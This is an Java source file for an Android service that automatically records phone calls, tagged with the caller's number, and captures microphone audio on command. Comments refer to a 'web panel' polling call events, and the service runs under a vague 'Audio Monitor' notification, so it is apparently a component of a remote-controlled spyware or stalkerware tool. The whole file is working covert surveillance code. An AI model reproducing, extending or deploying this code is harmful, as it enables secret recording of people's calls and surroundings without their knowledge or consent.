package com.security.ravan;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Service for call recording and microphone capture
 */
public class CallRecordService extends Service {

    private static final String TAG = "CallRecordService";
    private static final String CHANNEL_ID = "CallRecordServiceChannel";
    private static final int NOTIFICATION_ID = 3003;

    // Shared preferences keys
    public static final String PREFS_NAME = "RavanCallSettings";
    public static final String PREF_AUTO_RECORD_CALLS = "auto_record_calls";
    public static final String PREF_SAVE_ON_DEVICE = "save_on_device";

    // Static instance
    private static CallRecordService instance;

    // MediaRecorder for audio
    private MediaRecorder mediaRecorder;
    private PowerManager.WakeLock wakeLock;

    // Recording state
    private static volatile boolean isRecordingCall = false;
    private static volatile boolean isRecordingMic = false;
    private static String currentRecordingPath = null;
    private static String currentRecordingType = null; // "call" or "mic"
    private static long recordingStartTime = 0;

    // Call info
    private static String currentCallNumber = "";
    private static String currentCallType = ""; // "incoming" or "outgoing"
    private static boolean callInProgress = false;

    // Settings
    private static boolean autoRecordEnabled = true;
    private static boolean saveOnDeviceEnabled = true;

    public static CallRecordService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        createNotificationChannel();

        // Initialize WakeLock
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Ravan:CallRecordWakeLock");

        // Load settings
        loadSettings();

        Log.d(TAG, "CallRecordService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();

            if ("START_SERVICE".equals(action)) {
                startForegroundService();
            } else if ("START_CALL_RECORDING".equals(action)) {
                String phoneNumber = intent.getStringExtra("phone_number");
                String callType = intent.getStringExtra("call_type"); // incoming/outgoing
                startCallRecording(phoneNumber, callType);
            } else if ("STOP_CALL_RECORDING".equals(action)) {
                stopCallRecording();
            } else if ("START_MIC_RECORDING".equals(action)) {
                int duration = intent.getIntExtra("duration", 0); // 0 = indefinite
                startMicRecording(duration);
            } else if ("STOP_MIC_RECORDING".equals(action)) {
                stopMicRecording();
            } else if ("CALL_STATE_CHANGED".equals(action)) {
                int callState = intent.getIntExtra("call_state", 0);
                String phoneNumber = intent.getStringExtra("phone_number");
                handleCallStateChange(callState, phoneNumber);
            } else if ("UPDATE_SETTINGS".equals(action)) {
                boolean autoRecord = intent.getBooleanExtra("auto_record", true);
                boolean saveOnDevice = intent.getBooleanExtra("save_on_device", true);
                updateSettings(autoRecord, saveOnDevice);
            }
        }

        return START_STICKY;
    }

    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Audio Monitor")
                .setContentText("Monitoring audio...")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+
            startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        Log.d(TAG, "CallRecordService started in foreground");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Call Recording Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Service for recording calls and microphone");

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void loadSettings() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        autoRecordEnabled = prefs.getBoolean(PREF_AUTO_RECORD_CALLS, true);
        saveOnDeviceEnabled = prefs.getBoolean(PREF_SAVE_ON_DEVICE, true);
        Log.d(TAG, "Settings loaded - AutoRecord: " + autoRecordEnabled + ", SaveOnDevice: " + saveOnDeviceEnabled);
    }

    private void updateSettings(boolean autoRecord, boolean saveOnDevice) {
        autoRecordEnabled = autoRecord;
        saveOnDeviceEnabled = saveOnDevice;

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit()
                .putBoolean(PREF_AUTO_RECORD_CALLS, autoRecord)
                .putBoolean(PREF_SAVE_ON_DEVICE, saveOnDevice)
                .apply();

        Log.d(TAG, "Settings updated - AutoRecord: " + autoRecord + ", SaveOnDevice: " + saveOnDevice);
    }

    // Called when phone state changes (from CallReceiver)
    public void handleCallStateChange(int callState, String phoneNumber) {
        Log.d(TAG, "Call state changed: " + callState + ", number: " + phoneNumber);

        switch (callState) {
            case 1: // RINGING (incoming call)
                currentCallNumber = phoneNumber != null ? phoneNumber : "Unknown";
                currentCallType = "incoming";
                callInProgress = true;

                // Notify web panel
                notifyCallIncoming(phoneNumber);

                // Auto-record if enabled
                if (autoRecordEnabled) {
                    startCallRecording(phoneNumber, "incoming");
                }
                break;

            case 2: // OFFHOOK (call answered or outgoing call)
                if (!callInProgress) {
                    // This is an outgoing call
                    currentCallNumber = phoneNumber != null ? phoneNumber : "Unknown";
                    currentCallType = "outgoing";
                    callInProgress = true;

                    // Notify web panel
                    notifyCallOutgoing(phoneNumber);

                    // Auto-record if enabled
                    if (autoRecordEnabled && !isRecordingCall) {
                        startCallRecording(phoneNumber, "outgoing");
                    }
                }
                break;

            case 0: // IDLE (call ended)
                callInProgress = false;

                // Stop recording if in progress
                if (isRecordingCall) {
                    stopCallRecording();
                }

                notifyCallEnded();

                currentCallNumber = "";
                currentCallType = "";
                break;
        }
    }

    private void notifyCallIncoming(String phoneNumber) {
        // This will be polled by web panel
        Log.d(TAG, "Incoming call notification: " + phoneNumber);
    }

    private void notifyCallOutgoing(String phoneNumber) {
        Log.d(TAG, "Outgoing call notification: " + phoneNumber);
    }

    private void notifyCallEnded() {
        Log.d(TAG, "Call ended notification");
    }

    // ============ CALL RECORDING ============

    public void startCallRecording(String phoneNumber, String callType) {
        if (isRecordingCall || isRecordingMic) {
            Log.w(TAG, "Already recording something");
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "RECORD_AUDIO permission not granted");
                return;
            }
        }

        try {
            acquireWakeLock();

            // Create directory
            File recordDir = getRecordingsDirectory();
            if (!recordDir.exists()) {
                recordDir.mkdirs();
            }

            // Create filename
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                    .format(new Date());
            String safeNumber = (phoneNumber != null ? phoneNumber : "unknown")
                    .replaceAll("[^0-9+]", "");
            String fileName = "CALL_" + callType + "_" + safeNumber + "_" + timestamp + ".m4a";

            File recordFile = new File(recordDir, fileName);
            currentRecordingPath = recordFile.getAbsolutePath();
            currentRecordingType = "call";

            // Setup MediaRecorder
            mediaRecorder = new MediaRecorder();

            // Use VOICE_CALL if available, otherwise use MIC
            try {
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
            } catch (Exception e) {
                Log.w(TAG, "VOICE_CALL not available, using MIC");
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            }

            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(128000);
            mediaRecorder.setAudioSamplingRate(44100);
            mediaRecorder.setOutputFile(currentRecordingPath);

            mediaRecorder.prepare();
            mediaRecorder.start();

            isRecordingCall = true;
            recordingStartTime = System.currentTimeMillis();
            currentCallNumber = phoneNumber;
            currentCallType = callType;

            updateNotification("Recording " + callType + " call: " + phoneNumber);

            Log.d(TAG, "Call recording started: " + currentRecordingPath);

        } catch (Exception e) {
            Log.e(TAG, "Error starting call recording", e);
            isRecordingCall = false;
            releaseMediaRecorder();
        }
    }

    public void stopCallRecording() {
        if (!isRecordingCall) {
            return;
        }

        Log.d(TAG, "Stopping call recording");
        isRecordingCall = false;

        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping MediaRecorder", e);
        }

        releaseMediaRecorder();
        releaseWakeLock();

        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
        Log.d(TAG, "Call recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);

        updateNotification("Monitoring audio...");
    }

    // ============ MICROPHONE RECORDING ============

    public void startMicRecording(int durationSeconds) {
        if (isRecordingCall || isRecordingMic) {
            Log.w(TAG, "Already recording something");
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "RECORD_AUDIO permission not granted");
                return;
            }
        }

        try {
            acquireWakeLock();

            // Create directory
            File recordDir = getRecordingsDirectory();
            if (!recordDir.exists()) {
                recordDir.mkdirs();
            }

            // Create filename
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                    .format(new Date());
            String fileName = "MIC_" + timestamp + ".m4a";

            File recordFile = new File(recordDir, fileName);
            currentRecordingPath = recordFile.getAbsolutePath();
            currentRecordingType = "mic";

            // Setup MediaRecorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(128000);
            mediaRecorder.setAudioSamplingRate(44100);
            mediaRecorder.setOutputFile(currentRecordingPath);

            // Set max duration if specified
            if (durationSeconds > 0) {
                mediaRecorder.setMaxDuration(durationSeconds * 1000);
                mediaRecorder.setOnInfoListener((mr, what, extra) -> {
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stopMicRecording();
                    }
                });
            }

            mediaRecorder.prepare();
            mediaRecorder.start();

            isRecordingMic = true;
            recordingStartTime = System.currentTimeMillis();

            String durationText = durationSeconds > 0 ? " (max " + durationSeconds + "s)" : "";
            updateNotification("Recording microphone" + durationText);

            Log.d(TAG, "Microphone recording started: " + currentRecordingPath);

        } catch (Exception e) {
            Log.e(TAG, "Error starting microphone recording", e);
            isRecordingMic = false;
            releaseMediaRecorder();
        }
    }

    public void stopMicRecording() {
        if (!isRecordingMic) {
            return;
        }

        Log.d(TAG, "Stopping microphone recording");
        isRecordingMic = false;

        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping MediaRecorder", e);
        }

        releaseMediaRecorder();
        releaseWakeLock();

        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
        Log.d(TAG, "Microphone recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);

        updateNotification("Monitoring audio...");
    }

    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.reset();
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing MediaRecorder", e);
            }
            mediaRecorder = null;
        }
    }

    private void acquireWakeLock() {
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire(60 * 60 * 1000L); // 1 hour max
            Log.d(TAG, "WakeLock acquired");
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "WakeLock released");
        }
    }

    private void updateNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE);

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Audio Monitor")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, notification);
            }
        }
    }

    private File getRecordingsDirectory() {
        if (saveOnDeviceEnabled) {
            return new File(Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_MUSIC), "RavanRecordings");
        } else {
            return new File(getFilesDir(), "recordings");
        }
    }

    // ============ STATIC ACCESSORS ============

    public static boolean isRecordingCall() {
        return isRecordingCall;
    }

    public static boolean isRecordingMic() {
        return isRecordingMic;
    }

    public static boolean isRecording() {
        return isRecordingCall || isRecordingMic;
    }

    public static String getCurrentRecordingPath() {
        return currentRecordingPath;
    }

    public static String getCurrentRecordingType() {
        return currentRecordingType;
    }

    public static long getRecordingDuration() {
        if ((isRecordingCall || isRecordingMic) && recordingStartTime > 0) {
            return (System.currentTimeMillis() - recordingStartTime) / 1000;
        }
        return 0;
    }

    public static String getCurrentCallNumber() {
        return currentCallNumber;
    }

    public static String getCurrentCallType() {
        return currentCallType;
    }

    public static boolean isCallInProgress() {
        return callInProgress;
    }

    public static boolean isAutoRecordEnabled() {
        return autoRecordEnabled;
    }

    public static boolean isSaveOnDeviceEnabled() {
        return saveOnDeviceEnabled;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "CallRecordService onDestroy");

        if (isRecordingCall) {
            stopCallRecording();
        }
        if (isRecordingMic) {
            stopMicRecording();
        }

        releaseMediaRecorder();
        releaseWakeLock();
        instance = null;
    }
}
